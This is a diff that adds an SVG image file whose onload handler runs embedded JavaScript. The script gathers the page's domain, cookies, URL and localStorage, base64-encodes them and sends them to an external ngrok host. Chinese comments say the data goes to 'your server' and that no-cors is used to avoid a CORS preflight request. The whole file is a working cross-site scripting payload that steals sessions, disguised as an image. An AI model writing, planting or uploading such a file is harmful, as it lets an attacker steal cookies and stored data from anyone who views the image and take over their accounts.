@@ -1,0 +1,19 @@
+<?xml version="1.0" standalone="no"?>
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg" onload="exfiltrateData()">
+   <script type="text/javascript">
+      function exfiltrateData() {
+         const data = {
+            domain: document.domain,
+            cookie: document.cookie,
+            url: window.location.href,
+            localStorage: JSON.stringify(localStorage)
+         };
+
+         // 使用 fetch 將資料發送到你的伺服器
+         fetch('https://chanceful-tova-mercuric.ngrok-free.dev/log?data=' + btoa(JSON.stringify(data)), {
+            method: 'GET',
+            mode: 'no-cors' // 避免觸發 CORS 預檢請求
+         });
+      }
+   </script>
+</svg>
